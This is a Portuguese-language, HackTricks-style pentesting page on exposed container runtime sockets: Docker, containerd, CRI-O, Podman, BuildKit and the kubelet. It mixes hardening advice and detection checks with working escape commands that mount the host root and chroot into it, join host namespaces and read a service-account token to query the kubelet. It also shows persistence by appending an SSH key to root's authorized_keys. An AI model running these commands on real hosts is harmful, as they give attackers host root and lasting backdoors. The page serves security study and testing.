# Exposição da Runtime API e do Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

Muitos comprometimentos reais de containers não começam com um namespace escape. Eles começam com acesso ao control plane da runtime. Se uma workload puder se comunicar com `dockerd`, `containerd`, CRI-O, Podman ou kubelet por meio de um Unix socket montado ou de um listener TCP exposto, o atacante poderá solicitar um novo container com privilégios maiores, montar o filesystem do host, ingressar nos namespaces do host ou recuperar informações sensíveis do node. Nesses casos, a runtime API é a verdadeira security boundary, e comprometê-la é, na prática, quase o mesmo que comprometer o host.

É por isso que a exposição do runtime socket deve ser documentada separadamente das proteções do kernel. Um container com seccomp, capabilities e confinamento MAC comuns ainda pode estar a uma chamada de API do comprometimento do host se `/var/run/docker.sock` ou `/run/containerd/containerd.sock` estiver montado dentro dele. O isolamento do kernel do container atual pode estar funcionando exatamente como projetado, enquanto o management plane da runtime permanece totalmente exposto.

## Modelos de acesso ao Daemon

O Docker Engine tradicionalmente expõe sua API privilegiada por meio do Unix socket local em `unix:///var/run/docker.sock`. Historicamente, ele também foi exposto remotamente por meio de listeners TCP, como `tcp://0.0.0.0:2375`, ou de um listener protegido por TLS na porta `2376`. Expor o daemon remotamente sem TLS forte e autenticação de clientes transforma efetivamente a Docker API em uma interface de root remoto.

containerd, CRI-O, Podman e kubelet expõem superfícies semelhantes e de alto impacto. Os nomes e workflows diferem, mas a lógica não. Se a interface permite ao caller criar workloads, montar paths do host, recuperar credenciais ou alterar containers em execução, ela é um canal privilegiado de management e deve ser tratada como tal.

Os paths locais comuns que vale a pena verificar são:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Stacks mais antigos ou mais especializados também podem expor endpoints como `dockershim.sock`, `frakti.sock` ou `rktlet.sock`. Eles são menos comuns em ambientes modernos, mas, quando encontrados, devem ser tratados com a mesma cautela, pois representam superfícies de controle do runtime, e não sockets comuns de aplicações.

## Acesso remoto seguro

Se um daemon precisar ser exposto além do socket local, a conexão deverá ser protegida com TLS e, de preferência, com autenticação mútua, para que o daemon verifique o cliente e o cliente verifique o daemon. O antigo hábito de abrir o daemon do Docker em HTTP sem criptografia por conveniência é um dos erros mais perigosos na administração de containers, pois a superfície da API é poderosa o suficiente para criar containers privilegiados diretamente.

O padrão histórico de configuração do Docker era semelhante a:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Em hosts baseados em systemd, a comunicação com o daemon também pode aparecer como `fd://`, indicando que o processo herda um socket pré-aberto do systemd, em vez de fazer o bind diretamente. A lição importante não é a sintaxe exata, mas a consequência para a segurança. No momento em que o daemon aceita conexões além de um socket local com permissões rigorosamente restritas, a segurança do transporte e a autenticação do cliente tornam-se obrigatórias, e não apenas medidas opcionais de hardening.

## Abuso

Se houver um socket de runtime, confirme qual é, se existe um cliente compatível e se o acesso HTTP bruto ou gRPC é possível:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Esses comandos são úteis porque distinguem entre um caminho inexistente, um socket montado mas inacessível e uma API privilegiada ativa. Se o cliente for bem-sucedido, a próxima questão é saber se a API pode iniciar um novo container com um bind mount do host ou compartilhamento de namespace do host.

### Quando Nenhum Cliente Está Instalado

A ausência de `docker`, `podman` ou outra CLI amigável não significa que o socket esteja seguro. O Docker Engine usa HTTP sobre seu socket Unix, e o Podman expõe tanto uma API compatível com Docker quanto uma API nativa do Libpod por meio de `podman system service`. Isso significa que um ambiente mínimo contendo apenas `curl` ainda pode ser suficiente para controlar o daemon:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Isso é importante durante o post-exploitation porque os defensores às vezes removem os binários cliente usuais, mas deixam o management socket montado. Em hosts Podman, lembre-se de que o caminho de alto valor difere entre deployments rootful e rootless: `unix:///run/podman/podman.sock` para instâncias de serviço rootful e `unix://$XDG_RUNTIME_DIR/podman/podman.sock` para instâncias rootless.

### Exemplo completo: Docker Socket para o root do host

Se `docker.sock` estiver acessível, o escape clássico é iniciar um novo container que monte o filesystem root do host e então executar `chroot` nele:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Isso fornece execução direta como root do host por meio do daemon do Docker. O impacto não se limita à leitura de arquivos. Uma vez dentro do novo container, o atacante pode alterar arquivos do host, coletar credenciais, implantar persistência ou iniciar workloads privilegiados adicionais.

### Exemplo completo: Docker Socket para os Namespaces do Host

Se o atacante preferir entrar nos namespaces em vez de obter acesso somente ao sistema de arquivos:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Este caminho alcança o host solicitando ao runtime que crie um novo container com exposição explícita ao namespace do host, em vez de explorar o container atual.

### Padrão de Persistência por Docker Socket

O controle do runtime também pode ser usado para persistência, em vez de um shell de uso único. O padrão genérico consiste em criar um container auxiliar com um mount do host, gravar material de acesso autorizado ou um hook de inicialização no sistema de arquivos montado do host e, em seguida, validar se o host o consome.

Formato do exemplo:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
A mesma ideia pode atingir systemd units, cron fragments, application startup files ou SSH keys, dependendo do que o operador deseja comprovar. O ponto importante é que a alteração persistente é feita por meio da autoridade do runtime daemon sobre o filesystem do host, e não por meio de privilégios adicionais no container original.

### Raw Docker API Helper Pivot

Quando o Docker CLI não está disponível, o mesmo fluxo de helper com host-mount pode ser executado por HTTP através do Unix socket. O fluxo genérico é: confirmar a API, criar um helper container com um host bind mount, iniciá-lo, criar uma exec instance e iniciar essa exec.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
A solicitação final `/exec/<id>/start` depende do ID de exec retornado, mas o ponto de segurança é independente do fluxo exato do JSON: o acesso direto à API a um daemon Docker rootful é suficiente para solicitar um workload auxiliar com privilégios mais fortes.

### Exemplo completo: Socket do containerd

Um socket `containerd` montado geralmente é igualmente perigoso:<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Se um client mais parecido com o Docker estiver presente, `nerdctl` pode ser mais conveniente que `ctr`, pois expõe flags familiares como `--privileged`, `--pid=host` e `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
O impacto é novamente o comprometimento do host. Mesmo que as ferramentas específicas do Docker estejam ausentes, outra runtime API ainda pode oferecer o mesmo poder administrativo. Em nodes do Kubernetes, `crictl` também pode ser suficiente para reconhecimento e interação com containers, pois se comunica diretamente com o endpoint CRI.

### BuildKit Socket

`buildkitd` pode passar facilmente despercebido porque as pessoas costumam considerá-lo "apenas o backend de build", mas o daemon ainda é um control plane privilegiado. Um `buildkitd.sock` acessível pode permitir que um atacante execute etapas de build arbitrárias, inspecione as capacidades dos workers, use contextos locais do ambiente comprometido e solicite entitlements perigosos, como `network.host` ou `security.insecure`, quando o daemon foi configurado para permiti-los.

As primeiras interações úteis são:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Se o daemon aceitar solicitações de build, teste se estão disponíveis entitlements inseguros:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
O impacto exato depende da configuração do daemon, mas um serviço BuildKit rootful com entitlements permissivos não é uma conveniência inofensiva para desenvolvedores. Trate-o como outra superfície administrativa de alto valor, especialmente em CI runners e nós de build compartilhados.

### API do Kubelet via TCP

O kubelet não é um container runtime, mas ainda faz parte do plano de gerenciamento do nó e frequentemente está incluído na mesma discussão sobre limites de confiança. Se a porta segura `10250` do kubelet estiver acessível a partir do workload, ou se credenciais do nó, kubeconfigs ou permissões de proxy estiverem expostas, o atacante poderá conseguir enumerar Pods, recuperar logs ou executar comandos em containers locais do nó sem jamais passar pelo caminho de admission do servidor da API do Kubernetes.

Comece pela descoberta barata:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Se o kubelet ou o caminho de proxy do API-server autorizar `exec`, um cliente compatível com WebSocket poderá transformar isso em execução de código em outros containers no node. Esse também é o motivo pelo qual `nodes/proxy` com apenas a permissão `get` é mais perigoso do que parece: a solicitação ainda pode alcançar endpoints do kubelet que executam comandos, e essas interações diretas com o kubelet não aparecem nos logs normais de auditoria do Kubernetes.<sup>[[2]](#references)</sup>

## Verificações

O objetivo dessas verificações é determinar se o container pode alcançar algum plano de gerenciamento que deveria ter permanecido fora do limite de confiança.
```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
O que é interessante aqui:

- Um runtime socket montado geralmente é uma primitiva administrativa direta, e não apenas uma divulgação de informações.
- Um listener TCP na porta `2375` sem TLS deve ser tratado como uma condição de comprometimento remoto.
- Variáveis de ambiente como `DOCKER_HOST` geralmente revelam que o workload foi projetado intencionalmente para se comunicar com o runtime do host.

## Padrões do Runtime

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Unix socket local por padrão | `dockerd` escuta no socket local e o daemon geralmente é rootful | montar `/var/run/docker.sock`, expor `tcp://...:2375`, TLS fraco ou ausente em `2376` |
| Podman | CLI daemonless por padrão | Nenhum daemon privilegiado de longa duração é necessário para o uso local comum; API sockets ainda podem ser expostos quando `podman system service` está habilitado | expor `podman.sock`, executar o serviço de forma ampla, uso de API rootful |
| containerd | Socket local privilegiado | A API administrativa é exposta por meio do socket local e geralmente consumida por ferramentas de nível superior | montar `containerd.sock`, acesso amplo a `ctr` ou `nerdctl`, expor namespaces privilegiados |
| CRI-O | Socket local privilegiado | O endpoint CRI destina-se a componentes confiáveis locais do node | montar `crio.sock`, expor o endpoint CRI a workloads não confiáveis |
| Kubernetes kubelet | API de gerenciamento local do node | O Kubelet não deve ser amplamente acessível a partir de Pods; o acesso pode expor o estado dos Pods, credenciais e recursos de execução, dependendo da autenticação e autorização | montar sockets ou certificados do kubelet, autenticação fraca do kubelet, usar host networking com um endpoint do kubelet acessível |

## References

- [1] [exploração do socket do containerd, parte 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Riscos de bypass do Kubernetes API Server](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
